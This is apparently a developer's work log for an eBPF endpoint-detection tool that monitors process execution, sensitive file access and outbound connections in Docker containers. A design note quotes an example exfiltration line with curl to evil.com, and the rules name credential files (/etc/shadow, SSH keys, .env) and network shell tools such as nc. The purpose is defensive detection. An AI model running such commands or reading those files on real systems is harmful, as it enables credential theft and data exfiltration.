# Work Log / Notes

---

## Completed

- [x] `execsnoop.bpf.c` + `main.go` — process monitor capturing execve events
- [x] `exitsnoop.bpf.c` — exit monitor built, then removed (see note below)
- [x] Integration tests pass while monitor runs — no false positives (snapshot: PrintProcess&Exit.png)
- [x] Fix `alert.go` format string bug — `comm=%!s(int32=...)` → correct output
- [x] `rules.go` — detection rules: shell spawn, network tools, short-lived exit
- [x] `alert.go` — Alert struct with Ppid, Uid, Container fields
- [x] `mnt_ns` container correlation — `execsnoop.bpf.c` reads `mnt_ns_id` via CO-RE, `container.go` resolves to container name
- [x] Fix `ExitEvent` struct alignment bug — Go struct field order did not match C struct
- [x] `opensnoop.bpf.c` — file access monitor with ring buffer, two-probe pattern (enter+exit)
- [x] File access detection rules — tiered severity: CRITICAL/HIGH/MEDIUM
- [x] Fix garbled comm/filename output — replaced `bytes.TrimRight` with `cstring()` (IndexByte)
- [x] Remove curl from process rules — decision: curl detection belongs in lsm-connect (destination-aware)
- [x] BPF fix: emit on EACCES/EPERM in addition to success — restores `cat /etc/shadow` detection
- [x] pid→container cache — fixes `container=unknown` and wrong ppid in exit events
- [x] Hybrid namespace strategy — `unknown-ns` CRITICAL alert for container escape, host Docker overlay CRITICAL rule
- [x] resolveContainer: immediate /proc rescan on cache miss before declaring unknown-ns
- [x] `lsm-connect.bpf.c` — network monitor with ring buffer, loopback filtered in BPF, audit-only
- [x] Network rules — RFC 1918 private IP filter, `externalAllowedContainers` allowlist, `checkNetworkRules`
- [x] Named constants — `nsRefreshInterval`, `externalAllowedContainers` (no more magic numbers)
- [x] `VALIDATION.md` + `validate.sh` — 7-test validation suite with concurrent integration traffic
- [x] Validation confirmed: all 7 detection rules fire correctly against real containers
- [x] Refactor Go structure — `cmd/`, `pkg/`, `internal/`, `kernel/` package layout
- [x] CI pipeline — GitHub Actions vet + test + build; `Makefile` with generate/build/test targets ✅

---

## Key Technical Notes

### TASK_COMM_LEN: 16 → 128
Changed `#define TASK_COMM_LEN 16` to `128` in all `.h` files to capture full executable paths.
Must match Go struct field size exactly — `Comm [128]byte`.

---

### mnt_ns_id — use __u32 not __u64
Kernel's `ns.inum` is `unsigned int` (32-bit). Use `__u32 mnt_ns_id` in C struct and `uint32` in Go.
`BPF_CORE_READ(task, nsproxy, mnt_ns, ns.inum)` — requires kernel 5.8+ BTF (6.1 confirmed working).

---

### Container name resolution
Docker sets `HOSTNAME` env var to container ID (short hash), NOT container name.
Reliable approach: `docker ps --no-trunc` → build full container ID → name map.
Then `/proc/<pid>/cgroup` → extract container ID → look up name.

Debian 12 / kernel 6.1 uses **cgroupv2** — path format is:
`0::/system.slice/docker-<64char-id>.scope` (not `/docker/<id>`)
Fixed `containerIDFromCgroup` to handle both cgroupv1 and cgroupv2 formats.

**Validated** — alert shows `container=order-processor-auth_service`, host processes silently skipped.

---

### ExitEvent struct alignment bug (fixed)
Original C struct had implicit 4-byte padding before `duration_ns`:
```
int pid (4) + int ppid (4) + unsigned exit_code (4) + [4 implicit pad] + unsigned long long duration_ns (8) + comm (128) = 152 bytes
```
Go struct had wrong field order (DurationNs first) → all fields read as garbage.

Fix: reordered `exitsnoop.h` — `duration_ns` first, explicit `unsigned int pad`:
```
duration_ns (8) + pid (4) + ppid (4) + exit_code (4) + pad (4) + comm (128) = 152 bytes, no implicit padding
```
Go `ExitEvent` updated to match exactly.

**Rule**: always put the largest field first to avoid implicit padding. Explicit pad fields replace tail padding so C sizeof == Go binary.Size.

---

### Why `unsigned long long` for duration_ns
`bpf_ktime_get_ns()` returns u64 (nanoseconds). An `unsigned int` (u32) overflows at ~4.29 seconds.
We saw python3 at 12,595ms in real output — that is 3× over the u32 limit. Must stay u64.

---

### Perf Buffer vs Ring Buffer
`execsnoop.bpf.c` uses `BPF_MAP_TYPE_PERF_EVENT_ARRAY` (perf buffer, older pattern).
All new programs (`exitsnoop`, `opensnoop`, `lsm-connect`) use `BPF_MAP_TYPE_RINGBUF` (modern — lower overhead, no per-CPU waste).

---

### Garbled comm/filename — cstring() fix
**Problem**: `bytes.TrimRight(b, "\x00")` scans from the RIGHT and stops at the first non-null byte.
`bpf_ringbuf_reserve` does NOT zero-initialize memory. `bpf_probe_read_user_str` writes up to the null terminator but leaves the rest of the buffer as garbage from previous ring buffer usage.
Result: comm and filename printed with garbage after the real string.

**Fix**: `cstring(b []byte)` uses `bytes.IndexByte(b, 0)` — finds the FIRST null byte and slices there. This is correct C-string semantics.

`bpf_get_current_comm` uses `strncpy` which DOES zero-pad, so comm was technically safe with TrimRight. But `bpf_probe_read_user_str` does NOT zero-pad. Both now use `cstring` for consistency.

---

### opensnoop: two-probe pattern (sys_enter + sys_exit)

**Why two probes?**
A single `sys_enter_openat` hook fires on every attempt — including when curl probes `~/.curlrc` which does not exist. This fires HIGH alerts for harmless config-file probing.

**Pattern**:
1. `sys_enter_openat` — read filename + process context, store in `pending_opens` hash map keyed by tid
2. `sys_exit_openat` — check return value, emit to ring buffer only if file was actually accessed, delete from map

**Return code logic** (critical — easy to get wrong):
- `ret >= 0` — valid fd, file opened successfully → emit
- `ret == -EACCES` — file EXISTS, OS blocked access (uid mismatch) → **emit** (attack attempt)
- `ret == -EPERM` — operation not permitted on existing file → **emit**
- `ret == -ENOENT` — file does not exist, just probing → **drop**
- other negative — benign errors → drop

**Mistake we made**: initially dropped ALL negative returns (`if ret < 0 → drop`).
This broke `cat /etc/shadow` detection: uid=1000 gets `-EACCES`, which was silently dropped.
Fix: `if ret < 0 && ret != -EACCES && ret != -EPERM → drop`

**Rule**: the access ATTEMPT against an existing sensitive file is the signal, whether the OS allowed it or not.

---

### File rule design — tiered severity

Learned through real output: not all sensitive files carry the same risk.

| Tier | Files | Severity | Reason |
|---|---|---|---|
| CRITICAL | `/root/.ssh/`, `/home/.ssh/` | CRITICAL | SSH keys → direct access |
| HIGH | `/etc/shadow`, `/run/secrets/`, `/proc/1/`, `.key`, `id_rsa`, `id_ed25519`, `.env` | HIGH | Credential theft, container escape |
| MEDIUM | `/etc/passwd`, `/etc/group` | MEDIUM | World-readable, but unexpected from app code |

**`.pem` removed** — too broad. Python `certifi` library loads `cacert.pem` (CA bundle) on every HTTPS request. Keeping `.pem` fires HIGH on every API call. Private keys are caught by `.key` and `id_*` names.
**TODO**: restore `.pem` with a path exception for `/site-packages/` and `/certifi/` before shipping.

---

### curl detection — why removed from process rules

**Original rule**: `curl_from_container` — alert when curl runs inside any non-whitelisted container.

**Problem**: fires on every Docker `HEALTHCHECK` (every Dockerfile has `curl -f http://localhost:PORT/health`), every integration test smoke test, and documentation examples. Fires on ALL containers, every 10–30 seconds.

**Root cause**: execsnoop sees the binary name, not the destination. Cannot distinguish:
- `curl http://localhost:8080/health` — health check, expected
- `curl https://evil.com/exfil` — attack

**Decision**: remove from process rules entirely. The correct detection is in `lsm-connect`, which hooks the network connection and can check destination IP/domain. `allowedMarketAPI = "api.coingecko.com"` constant is reserved for that enforcement.

**Lesson**: a rule that fires on every health check is worse than no rule — it trains operators to ignore alerts. Better to have a gap and fill it at the right layer.

---

### pid→container cache — fixes exit event unknowns

**Problem 1 — container=unknown**: Go tries to read `/proc/<pid>/ns/mnt` when an exit event arrives, but the process is already gone from `/proc`. Returns `unknown`.

**Problem 2 — wrong ppid**: `real_parent` in the kernel at exit time may have changed to init (PID 1) due to Linux reparenting — when a parent dies before its child, the child is reparented to init. So ppid in exit events was sometimes 0 or 1.

**Fix**: cache `pid → PidInfo{Container, Ppid}` when execsnoop fires (process starts). When exitsnoop fires, look up and evict from cache. Use cached values instead of re-reading `/proc`.

**Implementation**: `sync.Map` in `container.go` — safe for concurrent goroutine access. `LoadAndDelete` atomically retrieves and removes the entry.

**Limitation**: processes that started before the EDR agent launched have no cache entry — these still show `unknown`. This is expected and acceptable.

---

### Hybrid namespace strategy — host vs container vs escape

**Problem**: original design silently skipped ALL host processes in process rules.
If malware installs on the VM as uid=0, it appears as `container=host` and is never alerted.

**Decision**: Option A (skip all host) is too risky. Option B (full host whitelist) is a rabbit hole.
Implemented a "hybrid" strategy using mount namespace ID as the boundary:

| Namespace | Label | Action |
|---|---|---|
| mnt_ns == PID 1 namespace | `host` | skip most rules |
| mnt_ns in Docker map | `order-processor-xxx` | full container rules |
| mnt_ns not found anywhere | `unknown-ns` | CRITICAL escape alert |

**`unknown-ns` detection**:
After a cache miss, `resolveContainer` immediately rescans `/proc` to handle new containers
that started within the 30s refresh window. If STILL not found → return `"unknown-ns"`.
A process in an unrecognized namespace after a fresh rescan has no legitimate explanation —
it's either a container escape or an unauthorized namespace creation.

**Host-specific file rule**:
Instead of whitelisting all host processes, one targeted rule:
`host process + /var/lib/docker/overlay2/ → CRITICAL host_reads_container_fs`
This catches an attacker on the host reading container filesystems directly (bypasses container
isolation). No host whitelist needed — dockerd itself doesn't read overlay2 files at runtime.

**errno defines in BPF**:
`errno.h` is not available in BPF programs. Must define constants manually:
```c
#define EPERM   1
#define ENOENT  2
#define EACCES  13
```
These are stable Linux ABI values (`uapi/asm-generic/errno-base.h`). Never use raw numbers
in conditions — always define named constants for readability and maintainability.

---

### lsm-connect — LSM hook, network byte order, loopback filter

**Hook**: `lsm/socket_connect` — fires before every `connect()` syscall at kernel level.
Advantage over tracepoints: runs in the same security context as the connecting process — no TOCTOU gap.
Attached with `link.AttachLSM` (not `link.Tracepoint`).

**Audit-only**: always returns `0`. Scope originally said "block" — kept audit mode intentionally.
Blocking in a demo environment risks killing legitimate services. For this project, detection is sufficient.

**Network byte order**:
`sin_addr.s_addr` and `sin_port` are stored big-endian (network byte order) by the kernel.
Go reads them as little-endian uint32/uint16. Conversion in Go userspace:
```go
func netIP(n uint32) net.IP {
    return net.IPv4(byte(n), byte(n>>8), byte(n>>16), byte(n>>24))
}
func netPort(n uint16) uint16 { return (n>>8) | (n<<8) }
```
This works because the bytes are reversed when a big-endian value is read as little-endian.

**Loopback filter in BPF**:
```c
if ((dst_ip & 0xFF) == 0x7F) return 0;  // skip 127.x.x.x
```
Health checks and inter-process IPC flood the ring buffer. Filter loopback in BPF (cheap), defer
all other private range checks (10.x, 172.16.x, 192.168.x) to Go where policy can change without
recompiling BPF.

**externalAllowedContainers**:
Named constant list in `rules.go` — no hardcoded container names in logic.
Only `inventory_service` is permitted to connect to external IPs (CoinGecko market data).
Any other container connecting externally → HIGH `unauthorized_external_connect`.

---

### Named constants — no magic numbers

Two values extracted to named constants so intent is clear and changes are localized:
- `nsRefreshInterval = 30 * time.Second` — how often to rebuild the namespace cache
- `externalAllowedContainers` — list of containers permitted to make external connections

---

### Validation suite — concurrent attack + integration traffic

`VALIDATION.md` documents 7 threat scenarios. `validate.sh` executes them automatically.

Key design: integration tests run in background while attack tests fire.
This validates both detection (attacks caught) and precision (no false positives from normal traffic).

**Confirmed from real output** (`alerts/alert.log`):
- inventory_service connects to CoinGecko during normal operation → LOW audit log only (not HIGH)
- All 7 attack scenarios produce the expected alert at the expected severity
- No CRITICAL or HIGH from normal API traffic

**Confirmed from real output** (`alerts/alert.log`): all 7 attack scenarios produce expected alerts, no CRITICAL or HIGH from normal service traffic.

---

### Exit monitor removed — short_lived_failure dropped

`exitsnoop.bpf.c` was built and worked. The `short_lived_failure` rule (non-zero exit + duration < 100ms)
generated persistent whitelist churn: every test tool that failed quickly triggered it (`which`, `mkdir`,
`apt-get`, `bash`, `cat`). The rule design was too broad for a workload of long-lived Python services —
any utility that fails exits quickly, which describes normal behavior not attacks.

All three real threats are covered by the other monitors:
- RCE → `shell_spawn_container` CRITICAL (execsnoop)
- Credential theft → `sensitive_file_access` (opensnoop)
- Exfiltration → `unauthorized_external_connect` (lsm-connect)

**Decision**: dropped `short_lived_failure` and the entire exit monitor infrastructure (`exitsnoop`,
`checkExitRules`, `exitWhitelist`, `shortLivedThresholdMs`, pid→container cache).

The BPF files (`exit.bpf.c`, `exit.h`) remain in the repo as reference but nothing loads them.

---

### Ingress detection (lsm/socket_accept) — decided against

Discussed: adding `SEC("lsm/socket_accept")` to detect inbound connections — port scanners,
unexpected listeners, reverse shell callbacks.

**Decision: out of scope for this project.**

Reasons:
1. **Noise**: every inter-service API call (gateway → auth, gateway → inventory, etc.) triggers
   socket_accept. Without a container-level allowlist of expected inbound sources, every
   legitimate request fires an event. The order-processor has ~8 services making constant calls.
2. **Already covered**: the reverse shell scenario (attacker plants a listener, connects back)
   is already caught by `shell_spawn_container` CRITICAL (bash spawned) and
   `network_tool_container` HIGH (nc/ncat executed). Ingress would add a third alert for the
   same attack.
3. **Where it adds value**: detecting unexpected listening containers, or external scanners
   hitting internal services. Both require knowing which containers *should* accept connections —
   another policy list to maintain. Better fit for a dedicated network security tool.

If revisited: reuse `net_event` struct, add a `direction` flag (0=outbound, 1=inbound).

---

## Rule Philosophy (learned from trial and error)

1. **Never remove a rule just to suppress symptoms** — ask whether the rule fits the threat model first. If it doesn't (e.g., short_lived_failure on long-lived service containers), remove the rule, not the noise.
2. **BPF = wide net** — collect all relevant events with minimal kernel-side filtering.
3. **Go = smart rules** — all detection logic in userspace where context is available.
4. **False positives → make rules smarter, not smaller** — add comm/path context, not delete.
5. **Detection at the right layer** — process-level rules catch binary names; network-level (lsm-connect) catches destinations. Don't mix them.

---

